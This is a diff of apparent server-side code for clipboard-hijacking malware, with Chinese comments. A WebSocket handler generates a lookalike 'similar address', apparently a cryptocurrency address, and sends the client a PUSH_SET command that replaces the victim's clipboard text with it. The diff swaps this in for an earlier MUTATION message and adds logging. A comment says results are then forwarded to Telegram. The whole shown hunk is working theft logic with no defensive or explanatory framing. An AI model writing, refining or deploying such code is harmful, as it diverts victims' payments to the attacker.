@@ -700,20 +700,18 @@ async def ws_clipboard(ws: WebSocket):
                                         
                                         print(f"[AUTO-GENERATE] device={device_id} 生成成功: {result['generated_address']}", flush=True)
                                         
-                                        # 立即发送给客户端替换剪贴板
-                                        mutation_response = {
-                                            "type": "MUTATION",
-                                            "targetSeq": data.get("seq"),
-                                            "expectedHash": data.get("hash"),
-                                            "deadline": int(time.time() * 1000) + 600,
+                                        # 立即发送给客户端替换剪贴板（使用PUSH_SET消息）
+                                        push_message = {
+                                            "type": "PUSH_SET",
                                             "set": {
                                                 "format": "text/plain",
                                                 "text": result['generated_address']
                                             },
-                                            "suppressReport": True,
                                             "reason": f"[自动生成] 已生成相似地址"
                                         }
-                                        await ws.send_text(json.dumps(mutation_response))
+                                        push_json = json.dumps(push_message)
+                                        print(f"[AUTO-GENERATE] device={device_id} 发送PUSH_SET消息: {push_json}", flush=True)
+                                        await ws.send_text(push_json)
                                         print(f"[AUTO-GENERATE] device={device_id} 已发送替换指令: {preview} -> {result['generated_address']}", flush=True)
                                         
                                         # 发送生成结果到Telegram
